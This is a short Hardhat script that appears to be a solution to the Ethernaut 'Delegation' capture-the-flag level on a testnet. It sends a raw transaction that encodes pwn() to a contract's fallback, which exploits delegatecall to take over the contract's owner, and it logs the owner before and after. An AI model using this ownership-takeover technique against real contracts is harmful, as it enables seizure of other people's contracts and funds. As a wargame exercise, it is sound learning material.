import { ethers } from "hardhat";

require("dotenv").config();

const { GOERLI_URL, PRIVATE_KEY, CONTRACT_VICTIM } = process.env;
const tx = {
    
  };

async function main() {
  const [signer] = await ethers.getSigners();

  console.log("Attackers account:", signer.address);
    
  const Delegation = await ethers.getContractFactory("Delegation");
  const delegation = await Delegation.attach("0xAf7639B78337d4c9270199b8C985a95f2CaC6568");
  
  let owner = await delegation.owner();
  console.log("Victim's Owner", owner);

  const delegateeAbi = ['function pwn()']
  let iface = new ethers.utils.Interface(delegateeAbi)
  const data = iface.encodeFunctionData(`pwn`, [])

  const tx = await signer.sendTransaction({
    to: '0xAf7639B78337d4c9270199b8C985a95f2CaC6568',
    data,
    gasLimit: ethers.BigNumber.from(`100000`),
  });

  await tx.wait(1);
  
  owner = await delegation.owner();
  console.log("Victim's Owner", owner);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
